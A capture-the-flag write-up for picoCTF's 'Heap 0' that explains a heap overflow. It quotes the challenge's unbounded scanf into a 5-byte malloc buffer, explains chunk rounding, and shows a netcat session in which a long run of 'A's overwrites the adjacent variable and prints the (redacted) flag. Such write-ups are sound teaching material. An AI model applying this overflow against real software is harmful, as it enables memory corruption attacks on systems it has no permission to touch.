# Heap 0
## Pico CTF -- Easy


Heap 0 is an easy heap overflow challenge.

We are given the [source code](chall.c), and [compiled binary](chall) so no reversing is necessary.

From the source code, notice the program allows us to write to the buffer with no restrictions.

    void write_buffer() {
        printf("Data for buffer: ");
        fflush(stdout);
        scanf("%s", input_data);
    }

The scanf function reads from stdin, and in this case, stores that data in the **input_data** variable.

Notice, in the init function, we allocate heap memory for **input_data** and for  **safe_var**.

    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);

Because we can write an arbitrary number of bytes to the heap, we can overwrite the value of **safe_var** in memory. This is a textbook heap overflow.

The check_win() function checks to see if the contents of **save_var** have changed, so all we need to do to get the flag, is overflow the **input_data** buffer to modify the contents of **save_var**.


Notice the following constants, used in the program's malloc calls.

    #define FLAGSIZE_MAX 64
    // amount of memory allocated for input_data
    #define INPUT_DATA_SIZE 5
    // amount of memory allocated for safe_var
    #define SAFE_VAR_SIZE 5

If we try to write 5, or even 10 bytes, we fail to get an overflow. This is because in a typically 64 bit environment, malloc will automatically "round up" to satisfy memory alignment requirements, and adds metadata to track the size of the chunk.

This creates a minimum chunk size of 16 bytes. In this case, any payload >= 32 bytes is sufficent to overwrite **save_var**.


    └──╼ $nc tethys.picoctf.net 58860

    Welcome to heap0!
    I put my data on the heap so it should be safe from any tampering.
    Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

    Heap State:
    +-------------+----------------+
    [*] Address   ->   Heap Data   
    +-------------+----------------+
    [*]   0x6353a57412b0  ->   pico
    +-------------+----------------+
    [*]   0x6353a57412d0  ->   bico
    +-------------+----------------+

    1. Print Heap:		(print the current state of the heap)
    2. Write to buffer:	(write to your own personal block of data on the heap)
    3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:		(Try to print the flag, good luck)
    5. Exit

    Enter your choice: 2
    Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

    1. Print Heap:		(print the current state of the heap)
    2. Write to buffer:	(write to your own personal block of data on the heap)
    3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
    4. Print Flag:		(Try to print the flag, good luck)
    5. Exit

    Enter your choice: 4

    YOU WIN
    picoCTF{XXXXXXXXXXXXXXXXXXXXXXX}

